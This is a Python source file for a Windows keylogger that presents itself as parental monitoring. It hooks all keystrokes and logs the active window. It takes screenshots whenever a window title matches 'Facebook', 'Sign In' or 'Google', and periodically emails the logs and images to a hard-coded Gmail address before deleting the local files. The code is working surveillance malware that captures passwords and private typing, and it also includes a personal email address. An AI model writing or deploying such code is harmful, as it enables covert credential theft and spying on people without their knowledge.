from threading import Timer
from threading import Thread
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import subprocess, socket, base64, time, datetime, os, sys, urllib2, platform
import pythoncom, pyHook, Image, ImageGrab, win32api, win32gui, win32con, smtplib
import sqlite3 as db

con = db.connect("parentsdb.db")

with con:
    cur = con.cursor()
    cur.execute("SELECT password FROM parents WHERE email='sarahoyihmam@gmail.com'")

    # Email Settings				
    LOG_SENDMAIL = True			
    LOG_MAIL = 'sarahoyihmam@gmail.com'  	
    LOG_PASS = cur.fetchone()
    LOG_FROM = 'bla@blabla.com'		
    LOG_SUBJ = 'daily logs'         
    LOG_MSG = 'Howdy!'

    con.commit()

		
LOG_SCREENSHOT = True		
LOG_SCREENSNUM = 10				
LOG_INTERVAL = 30				
LOG_SCREEN = []					
LOG_SCREEN.append("Facebook")	
LOG_SCREEN.append("Sign In")	
LOG_SCREEN.append("Google")	

		
LOG_FILENAME = 'logs.txt'	
LOG_TOSEND = []					
LOG_ACTIVE = ''
LOG_STATE = False				
LOG_TIME = 0					
LOG_TEXT = ""					
LOG_TEXTSIZE = 100				
LOG_MINTERVAL = 10			
LOG_THREAD_kl = 0				
LOG_THREAD_ss = 0	


# Debug [Don't change]			
#LOG_ITERATE = 3				
print os.getcwd()				


main_thread_id = win32api.GetCurrentThreadId()

def Keylog(k, LOG_TIME, LOG_FILENAME):
	if os.name != 'nt': return "Not supported for this operating system.\n"
	global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
	LOG_STATE = True 
	main_thread_id = win32api.GetCurrentThreadId()

	
	
	LOG_TEXT += "\n===================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += ' ' + str(LOG_DATE) + ' >>> Logging started.. |\n'
	LOG_TEXT += "===================================================\n\n"

	
	w = win32gui
	LOG_ACTIVE = w.GetWindowText (w.GetForegroundWindow())
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += "[*] Window activated. [" + str(LOG_DATE) + "] \n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n"
	LOG_TEXT += " " + LOG_ACTIVE + " |\n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n\n"
	if LOG_TIME > 0:
		t = Timer(LOG_TIME, stopKeylog) 
		t.start()
	# open file to write
	LOG_FILE = open(LOG_FILENAME, 'w')
	LOG_FILE.write(LOG_TEXT)
	LOG_FILE.close()
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()
	
	LOG_FILE = open(LOG_FILENAME, 'a')
	LOG_TEXT += "\n\n===================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += " " + str(LOG_DATE) + ' >>> Logging finished. |\n'
	LOG_TEXT += "===================================================\n"
	LOG_STATE = False
	try: 
		LOG_FILE.write(LOG_TEXT)
		LOG_FILE.close()
	except:
		LOG_FILE.close()
	return True
	


def stopKeylog():
    win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);

def OnKeyboardEvent(event):
	global LOG_STATE, LOG_THREAD_ss
	
	if LOG_STATE == False: return True
	global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
	LOG_TEXT = ""
	LOG_FILE = open(LOG_FILENAME, 'a')
	
	wg = win32gui
	LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
	if LOG_NEWACTIVE != LOG_ACTIVE:
		
		LOG_DATE = datetime.datetime.now()
		LOG_TEXT += "\n\n[*] Window activated. [" + str(LOG_DATE) + "] \n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n"
		LOG_TEXT += " " + LOG_NEWACTIVE + " |\n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n\n"
		LOG_ACTIVE = LOG_NEWACTIVE
		# take screenshots while logging!
		if LOG_SCREENSHOT == True:
			LOG_IMG = 0
			while LOG_IMG < len(LOG_SCREEN):
				if LOG_NEWACTIVE.find(LOG_SCREEN[LOG_IMG]) > 0:
					LOG_TEXT += "[*] Taking " + str(LOG_SCREENSNUM) + " screenshot for \"" + LOG_SCREEN[LOG_IMG] + "\" match.\n"
					LOG_TEXT += "[*] Timestamp: " + str(datetime.datetime.now()) + "\n\n"
					ss = Thread(target=takeScreenshots, args=(LOG_THREAD_ss,LOG_SCREENSNUM,LOG_INTERVAL))
					ss.start()
					LOG_THREAD_ss += 1 
				LOG_IMG += 1
		LOG_FILE.write(LOG_TEXT)
	
	LOG_TEXT = ""	
	if event.Ascii == 8: LOG_TEXT += "\b"
	elif event.Ascii == 13 or event.Ascii == 9: LOG_TEXT += "\n"
	else: LOG_TEXT += str(chr(event.Ascii))
	# write to file
	LOG_FILE.write(LOG_TEXT) 
	LOG_FILE.close()
	
	return True

# screenshot function
def Screenshot():
	img=ImageGrab.grab()
	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
	img.save(saveas)
	if LOG_SENDMAIL == True:
		addFile = str(os.getcwd()) + "\\" + str(saveas)
		LOG_TOSEND.append(addFile) # add to the list

# take multiple screenshots function
# args = number of shots, interval between shots
def takeScreenshots(i, maxShots, intShots):
	shot = 0
	while shot < maxShots:
		shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
		Screenshot()
		time.sleep(intShots)
		shot += 1
	



server = smtplib.SMTP('smtp.gmail.com:587')
def sendEmail():
	msg = MIMEMultipart()
	msg['Subject'] = LOG_SUBJ
	msg['From'] = LOG_FROM
	msg['To'] = LOG_MAIL
	msg.preamble = LOG_MSG
	# attach each file in LOG_TOSEND list  
	for file in LOG_TOSEND:
		# attach text file
		if file[-4:] == '.txt':
			fp = open(file)
			attach = MIMEText(fp.read())
			fp.close()
		# attach images
		elif file[-4:] == '.png':
			fp = open(file, 'rb')
			attach = MIMEImage(fp.read())
			fp.close()
		attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
		msg.attach(attach)
		
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()  
	server.login(LOG_MAIL, LOG_PASS)
	server.sendmail(LOG_FROM, LOG_MAIL, msg.as_string())  
	server.quit()

# function to clean up fiels
def deleteFiles():
	if len(LOG_TOSEND) < 1: return True
	for file in LOG_TOSEND:
		os.unlink(file)
	

# begin keylogging
kl = Thread(target=Keylog, args=(LOG_THREAD_kl,LOG_TIME,LOG_FILENAME))
kl.start()
	
# if keylogging is running infinitely
if LOG_TIME < 1:
	# begin continuous loop
	while True:
		
		# zZzzzzZZzzZ
		time.sleep(LOG_MINTERVAL) # sleep for time specified
		
		LOG_NEWFILE = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
		# add file to the LOG_TOSEND list
		if LOG_SENDMAIL == True:
			addFile = str(os.getcwd()) + "\\" + str(LOG_NEWFILE)
			LOG_TOSEND.append(addFile) 
		
		LOG_SAVEFILE = open(LOG_NEWFILE, 'w')
		LOG_CHCKSIZE = open(LOG_FILENAME, 'r')
		LOG_SAVEFILE.write(LOG_CHCKSIZE.read())
		LOG_CHCKSIZE.close()
		try:
			LOG_SAVEFILE.write(LOG_SAVETEXT)
			LOG_SAVEFILE.close()
		except:
			LOG_SAVEFILE.close()
		
		# send email
		if LOG_SENDMAIL == True:
			sendEmail()
			time.sleep(60)
			deleteFiles()
		LOG_TOSEND = [] 
		
		

elif LOG_TIME > 0:
	
	time.sleep(LOG_TIME)
	time.sleep(360)
	
	if LOG_SENDMAIL == True:
		addFile = str(os.getcwd()) + "\\" + str(LOG_FILENAME)
		LOG_TOSEND.append(addFile) 
		sendEmail()
	time.sleep(2)

sys.exit()
	
